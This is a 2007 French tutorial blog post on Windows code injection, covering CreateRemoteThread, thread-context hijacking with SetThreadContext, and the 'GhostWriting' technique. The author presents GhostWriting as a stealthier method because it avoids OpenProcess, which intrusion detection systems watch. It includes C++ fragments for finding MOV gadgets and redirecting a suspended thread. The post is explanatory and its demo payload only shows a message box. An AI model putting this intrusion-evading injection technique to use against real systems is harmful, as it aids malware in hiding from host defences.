Titre:       Injection de code sous Windows|  
Auteur:      Vincent Bouzon - b0l0k  
Web:         http://www.c0ding.fr  
Date:        27 avril 2007


# Injection de code sous Windows #

Je suis tombé sur un POC de c0de90e7 sur Rootkit.com qui exposait une nouvelle technique d’injection de code dans un processus qui emploi une technique plus furtive que celles utilisées jusqu’alors.  
Avant d’expliquer en détail le procédé très astucieux employé par cette personne, je vais d’abord rappeler quelques notions techniques.

## I. CreateRemoteThread ##

Cette API est présente sous Windows NT, 2000, XP, Vista semble-t-il. Comme son nom l’indique celle-ci permet de créer un thread dans un autre processus.  
Son prototype:

```
HANDLE WINAPI CreateRemoteThread( //Renvoi un Handle sur le thread créé.
  HANDLE hProcess, //Handle sur le processus cible.
  LPSECURITY_ATTRIBUTES lpThreadAttributes, //Pointeur sur un déscripteur de sécurité choisi pour le thread
  SIZE_T dwStackSize, //Spécifie la taille de la pile à l'initialisation du thread.
  LPTHREAD_START_ROUTINE lpStartAddress, //Adresse du début de la routine.
  LPVOID lpParameter, //Pointeur sur des paramètres éventuels.
  DWORD dwCreationFlags, //Flags servant par exemple a créer le thread sans le lancer : CREATE_SUSPENDED...
  LPDWORD lpThreadId //Pointeur sur un DWORD pour recevoir l'ID du thread créé.
);
```
Comme on peut le constater, il est nécessaire d’avoir un HANDLE sur le processus cible et une routine chargée dans la mémoire de ce dernier.
Il nous faudra donc utiliser OpenProcess dont voilà le prototype:
```
HANDLE OpenProcess(
  DWORD dwDesiredAccess, //L'accès demandé au processus.
  BOOL bInheritHandle, //Bool pour déterminer si le Handle retourné peut être hérité.
  DWORD dwProcessId //L'Id du processus sur lequel nous demandons un Handle
);
```
Comme expliqué précédemment, ce procédé nécessite l’id du processus cible. Windows met à notre disposition une API nommée CreateToolhelp32Snapshot permettant la capture d’une information demandée.
```
HANDLE WINAPI CreateToolhelp32Snapshot(
  DWORD dwFlags, //Détermine l'information demandé, dans notre cas TH32CS_SNAPPROCESS
  DWORD th32ProcessID //Argument pour cette information demandé. Inutile pour nous.
);
```
Elle retourne un handle sur un snapshot que nous allons parcourir avec Process32First puis Process32Next. Les prototypes sont similaires.
```
BOOL WINAPI Process32First(
  HANDLE hSnapshot, //Handle de notre snapshot
  LPPROCESSENTRY32 lppe //Pointeur sur une structure de type PROCESSENTRY32.
);
 
typedef struct tagPROCESSENTRY32
{
  DWORD dwSize; //A remplir par la taille de la structure.
  DWORD cntUsage;
  DWORD th32ProcessID; //Notre ID convoité.
  ULONG_PTR th32DefaultHeapID;
  DWORD th32ModuleID;
  DWORD cntThreads;
  DWORD th32ParentProcessID; //ID du processus parent a celui-ci.
  LONG pcPriClassBase;
  DWORD dwFlags;
  CHAR szExeFile[MAX_PATH]; //Une chaîne contenant le nom du programme concerné .
} PROCESSENTRY32;
 
typedef PROCESSENTRY32 * PPROCESSENTRY32;
typedef PROCESSENTRY32 * LPPROCESSENTRY32;
```
Maintenant qu’il est possible d’utiliser OpenProcess, il va falloir mettre en place notre routine dans sa mémoire. Nous utiliserons pour cela VirtualAllocEx et WriteProcessMemory.
```
LPVOID VirtualAllocEx( //Renvoi l'adresse de la mémoire qui à été allouée.
  HANDLE hProcess, //Handle sur le processus où la mémoire sera allouée.
  LPVOID lpAddress, //Pointeur spécifiant l'adresse à laquelle nous voulons alloué la mémoire. Si c'est NULL il choisira par lui meme.
  SIZE_T dwSize, //Taille de la memoiré à allouée.
  DWORD flAllocationType, //Flags déterminant le type d'allocation .
  DWORD flProtect //Flags déterminant la protection assigné a cette zone de mémoire. Lecture, Écriture, Exécution etc ...
);
```
Enfin nous avons réussi a écrire dans la mémoire de ce processus. Il ne reste plus qu’à lancer notre routine en Thread dans ce processus.  
Codons… Notre routine affichera simplement une messagebox.  

[ExCreateRemoteThread.cpp](ExCreateRemoteThread.cpp)  

Voila  
On remarque que pour lancer une seule API dans un processus, il est plus simple d’écrire les arguments dans la mémoire de ce processus.  
Et passer directement comme argument l’adresse de l’API pour CreateRemoteThread.

## II. SetThreadContext ##
Ceci consiste à détourner le déroulement d’un thread du processus cible. Comment allons-nous procéder ? Il suffit de jouer avec les API SetThreadContext et GetThreadContext.  
Qu’est ce qu’un contexte ? C’est un ensemble d’informations nécessaire à la continuité du déroulement d’un thread a tout moment ( Exemple: état des registres ).  

Donc si nous pouvons modifier le contexte d’un thread il nous sera alors plus simple de détourner un thread sur notre routine, et cela tout simplement en modifiant EIP.  
Un code vaux mieux qu’un long discours… :  

[ExSetContext.cpp](ExSetContext.cpp)  

Voila les deux techniques les plus utilisées passons maintenant à la technique proposé par c0de90e7 sur Rootkit.com.

## III. GhostWriting ##

La technique a pour but d’injecter un code dans un processus de la façon la plus transparente possible.  
Son but étant de ne pas utiliser OpenProcess qui est très surveillé par les HIDS.

Comment allons nous écrire dans sa mémoire alors ?  

Le coeur de l’astuce se trouve ici: il va falloir utiliser les instructions du processus cible pour écrire en sa mémoire.  
Donc en réfléchissant un peu ou un lisant l’article de c0de90e7, il faut trouver une instruction du genre  *MOV [reg1],reg2* dans la mémoire du processus.  
Grâce à cette instruction appelée avec un SetThreadContext il est facile d’écrire où nous le souhaitons.  
Vous vous demandez *« ouai c’est bien jolie mais apres le MOV [reg1],reg ca risque de planter »*, peut être que vous pensez que
si on enchaîne un ResumeThread et un SuspendThread avec un petit timer ca peut passer sans trop de barbarisme.  
Il y’a beaucoup moins barbare que ca. Si on trouve un _MOV [reg1],reg2_ … ret et que les instructions qui séparent le mov du ret sont sans gravité ( ex: ADD reg, POP reg .. )  
il nous suffira alors de placer ESP comme il se doit pour qu’au RET nous allons où bon nous semble, par exemple un « JMP $ » qui bloquera le thread.
Let’s go … Nous allons recoder le POC de c0de90e7 afin de comprendre chacune des étapes.  

Premièrement, trouver une instruction *mov [reg1],reg2*. En parcourant un peu les manuels de Intel nous pouvons rassembler ces informations :  

```
//E => A ModR/M byte follows the opcode and specifies the operand. The operand is either a  
//general-purpose register or a memory address. If it is a memory address, the address is    
//computed from a segment register and any of the following values: a base register, an  
//index register, a scaling factor, or a displacement.  
//G => The reg field of the ModR/M byte selects a general register (for example, AX (000)).  
//v Word or doubleword, depending on operand-size attribute.
// 0×89 mov Ev,Gv
//ModR/M |Mod| Gv| Ev
//Bit 76 543 210
//Mod :
// 00 : [Ev] except if (Dst == 5) => [Dword]
// 01 : [Ev+byte]
// 10 : [Ev+dword]
// 11 : Ev
//Eax: 000
//Ecx: 001
//Edx: 010
//Ebx: 011
//Esp: 100
//Ebp: 101
//Esi: 110
//Edi: 111
```
En clair, il nous faudra trouver un Opcode 0×89 suivi d’un ModR/M avec les bits de mod à 00 ou 01 ( il nous faudra compenser l’offset ) et nous assurer que Ev soit différent de Gv.
```
LPBYTE ValidMov( LPBYTE* address , LPBYTE offset, LPBYTE regs)
{
 
      if( **address != 0x89 )
          return NULL;
 
      bool GoodReg[8] = { false, false, false, true, false, true , true, true };
 
      if( (*(*address + 1) & 0x80) == 0x80 ) return NULL;
 
      if( (*(*address + 1) & 0x40) == 0x40 )
      {
          *offset = *(*address + 2);
          BYTE Ev = *(*address + 1) >> 3 & 0x07 ;
          BYTE Gv =    *(*address + 1) & 0x07 ;
 
          if(Ev == Gv) return NULL;
 
          if( !GoodReg[Ev] || !GoodReg[Gv] ) return NULL;
 
          Ev = Ev << 4;
 
          *regs = Ev | Gv;
 
          *address += 3;
 
          return *address - 3;
      }
      else
      {
           if( (*(*address + 1) & 0x28) == 0x28 ) return NULL; //exception !
 
           *offset = 0;
           BYTE Ev = *(*address + 1) >> 3 & 0x07 ;
           BYTE Gv =    *(*address + 1) & 0x07 ;
 
           if(Ev == Gv) return NULL;
 
           if( !GoodReg[Ev] || !GoodReg[Gv] ) return NULL;
 
           Ev = Ev << 4;
 
           *regs = Ev | Gv;
 
           *address += 2;
 
           return *address - 2;
      }
 
      return NULL;
}
```
Enfin nous, maintenant que nous avons les instructions nécessaires permettant une écriture sécurisé. Nous allons écrire notre routine au dessus de la pile du Thread cible.
Il nous faudra avant tout placer l’adresse de notre JMP $ pour le RET dû au passage dans notre MOV :
```
if(SuspendThread(hThread) == -1)goto exit;
 
    CONTEXT Context;
    CONTEXT SafeContext;      //On sauvegarde le context d'origine.
    Context.ContextFlags = CONTEXT_FULL;
 
    if(!GetThreadContext(hThread, &Context))goto exit;
 
    SafeContext = Context;
 
    LPDWORD PtrToRegContext[9];
 
    PtrToRegContext[3] = &Context.Ebx;
    PtrToRegContext[5] = &Context.Ebp;
    PtrToRegContext[6] = &Context.Esi;
    PtrToRegContext[7] = &Context.Edi;
 
    LPDWORD SrcReg = PtrToRegContext[Regs/16];      //Adresse du DWORD dans Context du registre source (Gv).
    LPDWORD DstReg = PtrToRegContext[Regs%16];      //Adresse du DWORD dans Context du registre de destination(Ev)
 
    DWORD hAddrBase = Context.Esp - 8 - sizeof(sc);
 
    /********************************  <= hAddrBase
    /*     Adresse de notre jmp     */
    /********************************/
    /*     Notre                    */
    /*              Routine         */
    /********************************/
    /*             VIDE             */
    /********************************  <= Esp à l'origine
    /*     Pile du thread cible     */
    /*                              */
 
    (DWORD)*(DWORD *)&sc[6] = hAddrBase + 4;      //On remplit notre routine avec l'adresse de la chaine "oO"
 
    *SrcReg = AutoLock;
    *DstReg = hAddrBase - OffsetMov;
 
    // mov [hAddrBase - OffsetMov + OffsetMov], AutLock
 
    Context.Esp = hAddrBase - OffsetEsp;      //Avant le RET, ESP pointe sur hAddrBase et dans hAddrBase on trouve l'adresse de notre JMP $
    Context.Eip = GoodMov;                    //Re-direction du thread sur notre MOV
 
    if(!SetThreadContext(hThread,&Context))goto exit;      //C'est parti ....
```
Il faut vérifier si notre thread est bloqué à notre autolock, rien de plus simple :
```
void WaitEip(HANDLE hThread, DWORD Eip)
{
    CONTEXT Context;
    Context.ContextFlags = CONTEXT_CONTROL;
    do
    {
        if(!GetThreadContext(hThread, &Context)) return;
    }
    while(Context.Eip != Eip);
}
```
Je pense que vous avez maintenant compris le principe de cette technique. J’ai enlever le passage sur la protection DEP afin de raccourcir le code.  

[GhostWriting.cpp](GhostWriting.cpp)  

Mon code est à but pédagogique et non pour faire mieux que le POC **c0de90e7**.  
Attention il est possible de tomber sur un thread des gestions des messages Windows, en quel cas il faudra faire un PostMessage mais je vous laisse le plaisir de regarder l’article sur RootKit.com pour ca.  

__*Greetz:*__  
mxatone, ivanlef0u, n0cte.  
Et à m0m0, Nyxem pour avoir corrigé mon français.  

__*References*:__  
http://rootkit.com/newsread.php?newsid=689  
http://www.sandpile.org/ia32/opc_rm32.htm  
Intel _Volume2x_Instruction Set Reference.pdf